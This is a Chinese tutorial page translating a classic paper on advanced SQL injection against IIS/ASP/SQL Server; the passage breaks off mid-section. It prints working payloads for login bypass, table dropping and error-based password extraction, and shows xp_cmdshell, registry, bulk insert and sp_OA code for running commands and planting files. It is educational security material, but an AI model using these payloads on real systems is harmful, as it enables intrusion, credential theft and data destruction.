<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <title>SQL Server SQL数据库的高级sql注入的一些知识_mysql教程_IDC笔记</title>
    <meta name="keywords" content="PHP,PHP笔记,PHP教程" />
    <meta name="description" content="这篇文章主要为大家详细介绍了SQL Server SQL数据库的高级sql注入的一些知识，具有一定的参考价值，可以用来参考一下。

对此感兴趣的朋友，看看idc笔记做的技术笔记！[概 要]这篇" />
    <meta content="Responsive admin theme build on top of Bootstrap 4" name="description" />
    <meta content="idcnote.com" name="author" />
    <link rel="shortcut icon" href="/skin1/images/favicon.ico">
    <!--Morris Chart CSS -->
    <link rel="stylesheet" href="/skin1/css/morris.css">
    <link href="/skin1/css/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/metismenu.min.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/icons.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/style.css" rel="stylesheet" type="text/css">
<link href="/SyntaxHighlighter/shCoreDefault.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">
 SyntaxHighlighter.all();
</script>
<script>
var paras = document.getElementsByTagName("pre");
for ( var i=0;i<paras.length;i++ ) {
    paras[i].setAttribute("class","brush:php;toolbar:false");     
}
</script>
</head>
<body>
<!-- Begin page -->
		<div id="wrapper">
			<!-- Top Bar Start -->
			<div class="topbar">
				<!-- LOGO -->
				<div class="topbar-left">
					<a href="/" class="logo">
						<span class="logo-light">
                            <i class="mdi mdi-camera-control"></i>IDC笔记
                        </span>
						<span class="logo-sm">
                            <i class="mdi mdi-camera-control"></i>
                        </span>
					</a>
				</div>
				<nav class="navbar-custom">
					<ul class="navbar-right list-inline float-right mb-0">
						<!--<li class="dropdown notification-list list-inline-item d-none d-md-inline-block">
							<a class="nav-link waves-effect" href="#" id="btn-fullscreen">
								<i class="mdi mdi-arrow-expand-all noti-icon"></i>
							</a>
						</li>
						<li class="dropdown notification-list list-inline-item">
							<div class="dropdown notification-list nav-pro-img">
								<a class="dropdown-toggle nav-link arrow-none nav-user" data-toggle="dropdown" href="#" role="button" aria-haspopup="false" aria-expanded="false">
									<img src="/skin1/picture/user-4.jpg" alt="user" class="rounded-circle">
								</a>
								<div class="dropdown-menu dropdown-menu-right profile-dropdown ">
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-account-circle"></i> Profile</a>
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-wallet"></i> Wallet</a>
									<a class="dropdown-item d-block" href="#">
										<span class="badge badge-success float-right">11</span>
										<i class="mdi mdi-settings"></i> Settings</a>
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-lock-open-outline"></i> Lock screen</a>
									<div class="dropdown-divider"></div>
									<a class="dropdown-item text-danger" href="#">
										<i class="mdi mdi-power text-danger"></i> Logout</a>
								</div>
							</div>
						</li>
						-->
					</ul>
					<ul class="list-inline menu-left mb-0">
						<li class="float-left">
							<button class="button-menu-mobile open-left waves-effect">
                            <i class="mdi mdi-menu"></i>
                        </button>
						</li>
						<li class="d-none d-md-inline-block">
							<form role="search" class="app-search">
								<div class="form-group mb-0">
									<input type="text" class="form-control" placeholder="Search..">
									<button type="submit"><i class="fa fa-search"></i></button>
								</div>
							</form>
						</li>
					</ul>
				</nav>
			</div>
<!-- ========== Left Sidebar Start ========== -->
<div class="left side-menu">
    <div class="slimscroll-menu" id="remove-scroll">
    <!--- Sidemenu -->
    <div id="sidebar-menu">
    <!-- Left Menu Start -->
    <ul class="metismenu" id="side-menu">
			<li>
	    <a href="/mysql/biji/" class="waves-effect">
		    <i class="icon-share"></i>
		    <span>数据库笔记
		       	<span class="float-right menu-arrow">
		       	<i class="mdi mdi-chevron-right"></i>
		       	</span>
		    </span>
	    </a>
	</li>
	</ul>
</div>
<!-- Sidebar -->
<div class="clearfix"></div>
</div>
<!-- Sidebar -left -->
</div>
<!-- Left Sidebar End -->
<!-- Start right Content here -->
<div class="content-page">
	<div class="content">
		<div class="container-fluid">
			<div class="page-title-box">
				<div class="row align-items-center">
					<div class="col-sm-6">
						<h1 class="page-title">SQL Server SQL数据库的高级sql注入的一些知识</h1>
					</div>
                    <div class="panel-title">
                        2022-11-12 09:53:34                    </div>
				</div>
				<!-- end row -->
			</div>
			<!-- end page-title -->
			<!-- START ROW -->
			<div class="panel panel-forbid">
				<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>内容摘要</div>
			    <div class="panel-content">
			    <span>这篇文章主要为大家详细介绍了SQL Server SQL数据库的高级sql注入的一些知识，具有一定的参考价值，可以用来参考一下。

对此感兴趣的朋友，看看idc笔记做的技术笔记！[概 要]这篇</span>                                     
		    	</div>
			    <div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>文章正文</div>
			    <div class="panel-content">
			    <span><p>这篇文章主要为大家详细介绍了SQL Server SQL数据库的高级sql注入的一些知识，具有一定的参考价值，可以用来参考一下。</p>

<p>对此感兴趣的朋友，看看idc笔记做的技术笔记！</p><strong>[概 要]</strong>这篇文章讨论常用的&quot;sql注入&quot;技术的细节，应用于流行的Ms IIS/ASP/SQL-Server平台。这里探讨有关这种攻击各种可以注入程序访问数据和数据库防范的方法。这篇文章面向两种读者：一是基于数据库web程序开发人员和审核各种web程序的安全专家。<strong>[介 绍]</strong>结构化查询语言(SQL)是一种用来和数据库交互的文本语言SQL语言多种多样，大多的方言版本都共同宽松地遵循SQL-92标准(最新的ANSI标准[译者注：目前最新的是SQL-99])。SQL运行的典型的操作是&ldquo;查询&rdquo;，它是可以让数据库返回&ldquo;查询结果记录集&rdquo;的语句集合。SQL语句可以修改数据库的结构(用数据定义语言&quot;DDL&quot;)和操作数据库里的数据(用数据操作语言&quot;DML&quot;)。我们在这里着重讨论Transact-SQL(交互式SQL)，应用于SQL-Server的SQL一种方言(非标准SQL)。如果攻击者可以插一系列的SQL语句进入应用程序的数据查询时，Sql注入攻击就可能发生。一个典型的SQL语句是这样的：select id, forename, surname from authors这个查询语句将会从&#39;authors&#39;表中返回&#39;id&#39;，&#39;forename&#39;和&#39;surname&#39;列的所有行。返回的结果集也可以加以特定条件&#39;author&#39;限制：select id, forename, surname from authors where forename = &#39;john&#39; and surname = &#39;smith&#39;注意这里很重要的一点是&#39;john&#39;和&#39;smith&#39;是被单引号引住的，假设&#39;forename&#39;和&#39;surname&#39;字段是来自于用户的输入,攻击者就可能通过输入非法字符串来对这个查询进行SQL注入:Forename:jo&#39;hnSurname: smith查询语句就会变成:select id, forename, surname from authors where forename = &#39;jo&#39;hn&#39; and surname = &#39;smith&#39;当数据库试图执行这个查询，它会返回这样的错误:Server:Msg 170, Level 15, State 1, Line 1Line 1:Incorrect syntax near &#39;hn&#39;这是因为插入的单引号破坏了原来单引号引住的数据，数据库执行到&#39;hn&#39;时失败。如果攻击者这样输入:Forename: jo&#39;; drop table authors--Surname:...authors表就会被删掉，原因过一会再解释。似乎通过删除用户输入的字符串中的单引号或者通过一些方法避免它们出现可以解决这个问题。诚然如此，但是要实施这个解决方法还有很多的困难。因为首先:不是所有的用户提交的数据都是字符串形式，比如我们的用户输入通过&#39;id&#39;(看上去是个数字)来选择一个用户，我们的查询可能会这样：select id,forename,surname from authors where id=1234在这种情况下攻击者可以轻易的在数值输入后面添加SQL语句。在其他SQL方言中，使用着各种分隔符，比如MS Jet DBMS引擎，日期可以用&#39;#&#39;符号来分隔。其次,避免单引号并不像开始我们想象的那样是必要的解决办法，原因下面讨论。我们将以Active Server Pages(ASP)登陆页面为例子来详细说明，它访问一个Sql-Server数据库并且验证一个到我们假想的程序的访问。这是用户填写用户名和密码的表单页面：
<p>代码如下:</p>
<pre>
<code> 
&lt;HTML&gt; 
&lt;HEAD&gt; 
&lt;TITLE&gt;Login Page&lt;/TITLE&gt; 
&lt;/HEAD&gt; 
&lt;BODY bgcolor=&#39;000000&#39; text=&#39;cccccc&#39;&gt; 
&lt;FONT Face=&#39;tahoma&#39; color=&#39;cccccc&#39;&gt; 
&lt;CENTER&gt;&lt;H1&gt;Login&lt;/H1&gt; 
&lt;FORM action=&#39;process_login.asp&#39; method=post&gt; 
&lt;TABLE&gt; 
&lt;TR&gt;&lt;TD&gt;Username:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT type=text name=username size=100%width=100&gt;&lt;/INPUT&gt;&lt;/TD&gt;&lt;/TR&gt; 
&lt;TR&gt;&lt;TD&gt;Password:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT type=password name=password size=100% 
width=100&gt;&lt;/INPUT&gt;&lt;/TD&gt;&lt;/TR&gt; 
&lt;/TABLE&gt; 
&lt;INPUT type=submit value=&#39;Submit&#39;&gt; &lt;INPUT type=reset value=&#39;Reset&#39;&gt; 
&lt;/FORM&gt; 
&lt;/FONT&gt; 
&lt;/BODY&gt; 
&lt;/HTML&gt; 
</code></pre>这是&#39;process_login.asp&#39;的代码, 它处理用户登陆：
<p>代码如下:</p>
<pre>
<code> 
&lt;HTML&gt; 
&lt;BODY bgcolor=&#39;000000&#39; text=&#39;ffffff&#39;&gt; 
&lt;FONT Face=&#39;tahoma&#39; color=&#39;ffffff&#39;&gt; 
&lt;STYLE&gt; 
p { font-size=20pt ! important} 
font { font-size=20pt ! important} 
h1 { font-size=64pt ! important} 
&lt;/STYLE&gt; 
&lt;%@LANGUAGE = JScript %&gt; 
&lt;% 
function trace( str ) 
{ 
if( Request.form(&quot;debug&quot;) == &quot;true&quot; ) 
Response.write( str ); 
} 
function Login( cn ) 
{ 
var username; 
var password; 
username = Request.form(&quot;username&quot;); 
password = Request.form(&quot;password&quot;); 
var rso = Server.CreateObject(&quot;ADODB.Recordset&quot;); 
var sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39; 
and password = &#39;&quot; + password + &quot;&#39;&quot;; 
trace( &quot;query: &quot; + sql ); 
rso.open( sql, cn ); 
if (rso.EOF) 
{ 
rso.close(); 
%&gt;&lt;FONT Face=&#39;tahoma&#39; color=&#39;cc0000&#39;&gt; 
&lt;H1&gt; 
&lt;BR&gt;&lt;BR&gt; 
&lt;CENTER&gt;ACCESS DENIED&lt;/CENTER&gt; 
&lt;/H1&gt; 
&lt;/BODY&gt; 
&lt;/HTML&gt; 
&lt;% 
Response.end 
return; 
} 
else 
{ 
Session(&quot;username&quot;) = &quot;&quot; + rso(&quot;username&quot;); 
%&gt; 
&lt;FONT Face=&#39;tahoma&#39; color=&#39;00cc00&#39;&gt; 
&lt;H1&gt; 
&lt;CENTER&gt;ACCESS GRANTED&lt;BR&gt; 
&lt;BR&gt; 
Welcome, 
&lt;% Response.write(rso(&quot;Username&quot;)); 
Response.write( &quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot; ); 
Response.end 
} 
} 
function Main() 
{ 
//Set up connection 
var username 
var cn = Server.createobject( &quot;ADODB.Connection&quot; ); 
cn.connectiontimeout = 20; 
cn.open( &quot;localserver&quot;, &quot;sa&quot;, &quot;password&quot; ); 
username = new String( Request.form(&quot;username&quot;) ); 
if( username.length &gt; 0) 
{ 
Login( cn ); 
} 
cn.close(); 
} 
Main(); 
%&gt; 
</code></pre>这里讨论的是&#39;process_login.asp&#39;中的创建&#39;query string&#39;的部分:var sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39; and password = &#39;&quot; + password + &quot;&#39;&quot;;如果用户指定了下面这样的数据：Username: &#39;; drop table users--Password:&#39;users&#39;表会被删除，所有用户都不能登陆。&#39;--&#39;是Transact-SQL(交互式SQL)的单行注释符，&#39;;&#39;标志着一个查询的结束另一个查询的开始。用户名最后的&#39;--&#39;用来使这个特殊的查询无错误结束。攻击者只要知道用户名，就可以通过以下的输入以任何用户的身份登陆：Username: admin&#39;--攻击者可以通过下面的输入以用户表里的第一个用户来登陆：Username: &#39; or 1=1--...更有甚者，攻击者通过以下的输入可以以任意虚构的用户登陆：Username: &#39; union select 1, &#39;fictional_user&#39;, &#39;somoe_password&#39;, 1--因为程序相信攻击者指定的常量是数据库返回的记录集的一部分。[通过错误信息获取信息]这个技术是David Litchfield在一次渗透入侵测试中首先发现的，后来david写了篇关于这个技术的文章，很多作者都参考过这篇作品。这里我们讨论&ldquo;错误消息&rdquo;技术潜在的机制，使读者可以充分理解它并且能灵活应用。为了操作数据库里的数据，攻击者要确定某个数据库的结构。例如：我们的&quot;user&quot;表是用下面的语句建立的：
<p>代码如下:</p>
<pre>
<code> 
create table users( id int, 
username varchar(255), 
password varchar(255), 
privs int 
) 
</code></pre>并且插入了下面的用户：insert into users values( 0, &#39;admin&#39;, &#39;r00tr0x!&#39;, 0xffff )insert into users values( 0, &#39;guest&#39;, &#39;guest&#39;, 0x0000 )insert into users values( 0, &#39;chris&#39;, &#39;password&#39;, 0x00ff )insert into users values( 0, &#39;fred&#39;, &#39;sesame&#39;, 0x00ff )我们假设攻击者要为自己插入一个用户，如果不知道表的结构的话，他不可能成功。即使他运气好，&#39;priv&#39;字段的重要性还不清楚。攻击者可能插入&#39;1&#39;，给自己在程序里添加了一个低权限的用户，而他的目标是管理员的权限。对于攻击者来说幸运的是：如果程序返回错误(asp默认如此)，攻击者可以猜测整个数据库的结构，读取ASP程序连接到SQL-Server的帐号权限内可以读取的任何值。(下面给出的使用上面提供的示例数据库和asp脚本来说明这些技术怎样实现的)首先,攻击者要确定查询的表名和字段名。要做到这点，攻击者可以使用&#39;select&#39;语句的&#39;having&#39;子句：username: &#39; having 1=1 --这会引起下面的错误(译者注：having字句必须和GROUP BY或者聚合函数一起配合使用，否则出错)：
<p>代码如下:</p>
<pre>
<code> 
Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e14&#39; 
[Microsoft][ODBC SQL Server Driver][SQL Server]Column &#39;users.id&#39; is 
invalid in the select list because it is not contained in an aggregate 
function and there is no GROUP BY clause. 
/process_login.asp, line 35 
</code></pre>所以攻击者就知道了表名和第一列的列名，他们可以通过给每列加上&#39;group by&#39;子句继续得到其他列名，如下：
<p>代码如下:</p>
<pre>
<code> 
username: &#39; group by users.id having 1=1 -- 
(结果产生这样的错误) 
Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e14&#39; 
[Microsoft][ODBC SQL Server Driver][SQL Server]Column &#39;users.username&#39; 
is invalid in the select list because it is not contained in either an 
aggregate function or the GROUP BY clause. 
/process_login.asp, line 35 
</code></pre>最后攻击者得到了下面的&#39;username&#39;：&#39; group by users.id, users.username, users.password, users.privs having 1=1--这句没有错误，相当于：select * from users where username = &#39;&#39;所以攻击者知道了查询只是关于&#39;users&#39;表的，并且顺序使用了列&#39;id,username,password,rpivs&#39;。如果攻击者能确定各列的数据类型将会很有用，可以利用类型转换错误信息来达到这一点，看下面的例子：Username: &#39; union select sum(username) from users--这利用了SQL-Server试图在确定两行是否相同之前先执行&#39;sum&#39;子句的特性，计算文本域的和会返回这样的信息：Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39;[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or averageaggregate operation cannot take a varchar data type as an argument./process_login.asp, line 35它告诉我们&#39;username&#39;字段的类型是&#39;varchar&#39;。相反的，如果我们试图计算数值型的字段，但结果两行的列数并不匹配：Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39;[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or averageaggregate operation cannot take a varchar data type as an argument./process_login.asp, line 35我们可以用这个技术来大概地确定数据库内各列的类型。这样攻击者就可以写出一个格式完美的&#39;insert&#39;语句：Username: &#39;; insert into users values( 666, &#39;attacker&#39;, &#39;foobar&#39;, 0xffff )--但是，这个技术的潜力不止这些。攻击者可以利用任何错误信息来暴露系统环境或者数据库信息。执行下面的语句可以得到一个标准错误信息的清单：select * from master..sysmessages检查这个清单可以发现很多有趣的信息。一个特别有用的信息有关类型转换，如果你试图将一个字符串转换成整型，整个字符串的内容将会出现在错误信息里。以我们登陆页的例子来说，使用下面的&#39;username&#39;将会返回SQL-Server的版本以及它所在服务器操作系统的版本信息:Username: &#39; union select @@version,1,1,1--Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39;[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error convertingthe nvarchar value &#39;Microsoft SQL Server 2000 - 8.00.194 (Intel X86) Aug6 2000 00:57:48 Copyright (c) 1988-2000 Microsoft Corporation EnterpriseEdition on Windows NT 5.0 (Build 2195: Service Pack 2) &#39; to a column ofdata type int./process_login.asp, line 35这试图将内置常量&#39;@@version&#39;转换成整型，因为&#39;users&#39;表第一列是整数。这个技术可以用来读取任何数据库的任何表的任何内容，如果攻击者对用户名和密码感兴趣，他们就可以从&#39;users&#39;表读用户名：Username: &#39; union select min(username),1,1,1 from users where username &gt; &#39;a&#39;--这将选出比&#39;a&#39;大的最小用户名,而且试图将它转换成一个整数:Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39;[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error convertingthe varchar value &#39;admin&#39; to a column of data type int./process_login.asp, line 35攻击者就知道&#39;admin&#39;帐号存在，他现在可以把他发现的用户名放进&#39;where&#39;子句来反复测试这行：Username: &#39; union select min(username),1,1,1 from users where username &gt; &#39;admin&#39;--Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39;[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error convertingthe varchar value &#39;chris&#39; to a column of data type int./process_login.asp, line 35一旦攻击者确定了用户名，他就可以搜集密码；Username: &#39; union select password,1,1,1 from users where username = &#39;admin&#39;--Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39;[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error convertingthe varchar value &#39;r00tr0x!&#39; to a column of data type int./process_login.asp, line 35一个更&ldquo;别致&rdquo;的技术是将用户名和密码连接成一个单独的字符传，然后试图将它转换成整型。这将举另一种例子；Transact-SQL语句可以将字符串连接成一行而不改变他们的意义，下面的脚本将连接这些值：
<p>代码如下:</p>
<pre>
<code> 
begin declare @ret varchar(8000) 
set @ret=&#39;:&#39; 
select @ret=@ret+&#39; &#39;+username+&#39;/&#39;+password from users where 
username&gt;@ret 
select @ret as ret into foo 
end 
</code></pre>攻击者用这个&#39;username&#39;登陆(明显都在同一行)Username: &#39;;begin declare @ret varchar(8000) set @ret=&#39;:&#39; select @ret=@ret+&#39; &#39;+username+&#39;/&#39;+password from users where username&gt;@ret select @ret as ret into foo end--这创建了一个只包含单列&#39;ret&#39;的表&#39;foo&#39;，而且把我们的字符串放在里面。通常一个低权限的用户可以在示例数据库里创建表，或者一个临时表。之后攻击者选择查询表里的字符串，就像前面说的：
<p>代码如下:</p>
<pre>
<code> 
Username: &#39; union select ret,1,1,1 from foo-- 
Username: &#39; union select ret,1,1,1 from foo-- 
Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39; 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting 
the varchar value &#39;: admin/r00tr0x! guest/guest chris/password 
fred/sesame&#39; to a column of data type int. 
/process_login.asp, line 35 
</code></pre>然后删除这个表：Username: &#39;; drop table foo--这些例子仅仅揭开了这项技术的神秘面纱，不用说，如果攻击者可以从数据库获得丰富的错误信息，他们的工作将大大的简化。[更深入的访问]一旦攻击者可以控制数据库，他们可能想通过这些权限来获得对网络更多的控制，可以通过很多方法来达到这一目的：1.利用xp_cmdshell扩展存储以SQL-Server用户的身份在数据库服务器上执行命令2.利用xp_regread扩展存储读取注册表的键值，也包括SAM(只要SQL-Server是以一个本地帐号运行的)3.用其他的扩展存储改变服务器设置4.在联合服务器上执行查询5.创建客户扩展存储从而在SQL-Server进程内运行exploit6.用&#39;bulk insert&#39;语句去读服务器上任何文件7.用bcp在服务器上创建任何文本文件8.用sp_OACreate，sp_OAMethod和sp_OAGetProperty系统存储过程来创建ActiveX对象来完成asp脚本可以做的任何事情这些只是常见的攻击方法的一部分；攻击者也很可能通过其他方法来达到目的，我们列举这些SQL-Server相关的攻击方法是为了说明如果程序可以被注入SQL语句时可能会发生什么，我们将依次给出以上各种情况的对策。[xp_cmdshell]扩展存储的本质是编译了的动态链接库(DLLs)，它用SQL-Server指定的调用方式去运行接口函数。他们允许SQL-Server程序拥有了和c/c++一样的功能，是个非常有用的特性。SQL-Server内置了大量的扩展存储，而且有各种各样的函数比如发送邮件和更改注册表。xp_cmdshell是一个内置的扩展存储，它允许执行任意的命令行程序。例如：exec master..xp_cmdshell &#39;dir&#39;将会获得一个SQL-Server进程所在工作目录的列表exec master..xp_cmdshell &#39;net1 user&#39;将提供主机用户的列表。如果SQL Server正常的以本地&#39;system&#39;帐号或者&#39;domain user&#39;帐号运行，攻击者可以造成更严重破坏。[xp_regread]另外一个有用的内置的扩展存储是xp_regXXX函数xp_regaddmultistringxp_regdeletekeyxp_regdeletevaluexp_regenumkeysxp_regenumvaluesxp_regreadxp_regremovemultistringxp_regwrite其中一些函数的用法的举例：exec xp_regread HKEY_LOCAL_MACHINE&#39;SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&#39;,&#39;nullsessionshares&#39;(它决定服务器的空连接式共享是否可用)exec xp_regenumvalues HKEY_LOCAL_MACHINE&#39;SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities&#39;(它显示所有的服务器上SNMP公共的设置，通过这个信息，攻击者可以在相同的网络区域里重新配置网络设置，因为SNMP共有设置很少被改变而且由很多主机共享)可以想象攻击者怎样利用这些函数来读取SAM文件，改变系统设置在重新启动后就被服务的应用，或者在用户下一次登陆时运行任意命令。[其他扩展存储]xp_servicecontrol扩展存储允许用户启动，停止，暂停或者运行服务。exec master..xp_servicecontrol &#39;start&#39;, &#39;schedule&#39;exec master..xp_servicecontrol &#39;start&#39;, &#39;server&#39;下面是一些其他有用的扩展存储表：xp_availablemedia 显示机器上可用的驱动器xp_dirtree 获得一个目录树xp_enumdsn 列举服务器上的ODBC数据源xp_loginconfig 显示服务器的安全状态信息xp_makecab 允许用户在服务器上创建压缩文件(或者任何服务器可以访问的文件)xp_ntsec_enumdomains 列举服务器可以访问的域xp_terminate_process 结束一个给定PID进程[联合服务器]SQL-Server提供了一个服务器联合的机制，就是允许一个数据库服务器上的查询操作其他服务器的数据。这些联合设置存放在master..sysservers表里，如果一个相连的服务器使用了&#39;sp_addlinkedsrvlogin&#39;存储过程，一个自动的登陆了的连接已经存在，可以通过它不登陆而访问该服务器。&#39;openquery&#39;函数允许查询在联合服务器上执行。[用户自定义扩展存储]扩展存储的API是相当简单的，创建一个带有恶意代码的扩展存储DLL也是相当容易的。通过命令行有很多方法将DLL上传到服务器，还有其他的很多方法包括各种通信机制来自动实现，比如HTTP下载和FTP脚本。一旦DLL文件出现在服务器上SQL-Server可以访问，这不一定需要SQL-server本身，攻击者可以通过下面添加扩展存储(这里，我们的恶意扩展存储是个用来操作服务器的文件系统小的木马)sp_addextendedproc &#39;xp_webserver&#39;, &#39;c:\temp\xp_foo.dll&#39;扩展存储就可以通过一般的方法调用：exec xp_webserver一旦这个扩展存储执行过，可以这样删除它:sp_dropextendedproc &#39;xp_webserver&#39;[向表中导入文本文件]利用&#39;bulk insert&#39;语句，可以把一个文本文件的内容插入进一张临时表，我们简单的创建一个表：create table foo( line varchar(8000) )然后执行bulk insert来插入数据来自于一个文件：bulk insert foo from &#39;c:\inetpub\wwwroot\process_login.asp&#39;通过上面介绍过的错误信息技巧就可以得到数据，或者通过一个&#39;union&#39;查询，把文本数据作为查询的数据返回。这对于获得存储在数据库里的脚本如asp脚本很有用。[利用BCP创建文本文件]利用和&#39;bulk insert&#39;作用相反的技术创建任意的文本文件非常简单。不过需要一个命令行工具&#39;bcp&#39;(&#39;bulk copy program&#39;)，因为bcp在SQL-Server进程外访问数据库，它需要一次登陆。但是这不难，因为攻击者都可以创建一个；或者如果服务器配置使用了&ldquo;完整性&rdquo;安全模式，攻击者可以利用它。命令行格式如下：bcp &quot;SELECT * FROM test..foo&quot; queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar&#39;S&#39;参数是要运行查询的服务器，&#39;U&#39;参数是用户名，&#39;P&#39;是密码，这里的密码是&#39;foobar&#39;。[SQL-Server 里的ActiveX自动脚本]SQL-Server提供了一些内置的扩展存储，允许在SQL-Server内创建ActiveX自动脚本。这些脚本在功能上和windows scripting host上运行的脚本或者asp脚本(通常用Javascript或者Vbscript编写)一样，脚本创建自动对象并且通过他们产生作用。一个用Transact-SQL写的自动脚本可以做任何asp脚本或者WSH脚本能做的事。下面提供一些例子来说明:1)这个例子用&#39;wscript.shell&#39;对象创建一个notepad的实例(当然这里也可以是任何命令行命令)
<p>代码如下:</p>
<pre>
<code> 
-- wscript.shell example 
declare @o int 
exec sp_oacreate &#39;wscript.shell&#39;, @o out 
exec sp_oamethod @o, &#39;run&#39;, NULL, &#39;notepad.exe&#39; 
</code></pre>在我们的例子里可以使用这样的用户名(都在一行)：Username: &#39;; declare @o int exec sp_oacreate &#39;wscript.shell&#39;, @o out exec sp_oamethod @o, &#39;run&#39;, NULL, &#39;notepad.exe&#39;--2)这个例子用&#39;scripting.filesystemobject&#39;对象去读已知的文本文件：
<p>代码如下:</p>
<pre>
<code> 
-- scripting.filesystemobject example - read a known file 
declare @o int, @f int, @t int, @ret int 
declare @line varchar(8000) 
exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out 
exec sp_oamethod @o, &#39;opentextfile&#39;, @f out, &#39;c:\boot.ini&#39;, 1 
exec @ret = sp_oamethod @f, &#39;readline&#39;, @line out 
while( @ret = 0 ) 
begin 
print @line 
exec @ret = sp_oamethod @f, &#39;readline&#39;, @line out 
end 
</code></pre>3)下面的例子创建一个asp脚本执行任意命令：
<p>代码如下:</p>
<pre>
<code> 
-- scripting.filesystemobject example - create a &#39;run this&#39; .asp file 
declare @o int, @f int, @t int, @ret int 
exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out 
exec sp_oamethod @o, &#39;createtextfile&#39;, @f out, &#39;c:\inetpub\wwwroot\foo.asp&#39;, 1 
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL, &#39; &#39; 
</code></pre>需要注意的很重要的一点是Windows NT4，IIS4平台asp脚本将会以&#39;system&#39;的帐号运行，而在IIS5他们会以低权限的IWAM_xxx帐号运行。4)这个例子(稍带欺骗性)说明这项技术的灵活性，它用&#39;speech.voicetext&#39;(译者注：参考ms-help://MS.VSCC/MS.MSDNVS.2052/dnwui/html/msdn_texttosp.htm)对象，使SQL Server说话：
<p>代码如下:</p>
<pre>
<code> 
declare @o int, @ret int 
exec sp_oacreate &#39;speech.voicetext&#39;, @o out 
exec sp_oamethod @o, &#39;register&#39;, NULL, &#39;foo&#39;, &#39;bar&#39; 
exec sp_oasetproperty @o, &#39;speed&#39;, 150 
exec sp_oamethod @o, &#39;speak&#39;, NULL, &#39;all your sequel servers are belong to,us&#39;, 528 
waitfor delay &#39;00:00:05&#39; 
</code></pre>这当然也可以在我们的例子里使用，通过指定下面的&#39;username&#39;(注意例子不只是注入一段脚本，同时也以&#39;admin&#39;的身份登陆了程序)用户名: admin&#39;;declare @o int, @ret int exec sp_oacreate &#39;speech.voicetext&#39;,@o out exec sp_oamethod @o, &#39;register&#39;, NULL, &#39;foo&#39;,&#39;bar&#39; exec sp_oasetproperty @o, &#39;speed&#39;, 150 exec sp_oamethod @o, &#39;speak&#39;, NULL, &#39;all your sequel servers are belong to us&#39;, 528 waitfor delay &#39;00:00:05&#39;-[存储过程]传统的认识是如果ASP程序使用了数据库系统的存储过程，那么就不可能SQL注入了。这句话不完全对，这依赖于ASP脚本调用存储过程的方式。本质上，一个带参数的查询执行了，用户提供的参数就被安全的传给查询，SQL注入就不可能了。但是，如果攻击者可以对无数据部分的查询语句施加任何影响，他们仍然可能控制数据库。一个有用的规则是：1. 如果ASP脚本创建了一个提交给服务器的SQL查询语句，这是很容易被SQL注入的，即使它使用了存储过程。2. 如果ASP脚本使用了封装传递参数给存储过程的过程对象(如ADO command对象，和参数集合一起使用的)那么它通常就很安全了，但是这还要取决于对象的执行。明显的，最好习惯于验证所有的用户输入，因为新的攻击技术会不停的涌现。为了说明存储过程查询的注入，运行下面的SQL语句:sp_who &#39;1&#39; select * from sysobjects或者sp_who &#39;1&#39; ; select * from sysobjects任何附加语句在存储过程执行后还是可以执行。[高级Sql注入]一个应用程序通常过滤单引号，另一方面限制用户的输入，比如限制长度。在这里，我们将讨论一些绕过一些明显的SQL注入防范的和长度限制的技巧。[没有符号的字符串]有时候，开发人员可能已经通过过滤单引号来保护应用程序，比如用VBScript的&#39;replace&#39;函数:
<p>代码如下:</p>
<pre>
<code> 
function escape( input ) 
input = replace(input, &quot;&#39;&quot;, &quot;&#39;&#39;&quot;) 
escape = input 
end function 
</code></pre>不可否认，这会阻止所有的对我们上面给出的对示例站点的攻击，删除&#39;;&#39;字符也会起作用。但是，在一个大的程序里一些用户输入可能被假定为数值型。这些值没有限制，提供了很多可以注入的地方。如果攻击者希望创建一个字符串值而不使用引号，他们可以用&#39;char&#39;函数。例如：
<p>代码如下:</p>
<pre>
<code> 
insert into users values( 666, 
char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), 
char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), 
0xffff) 
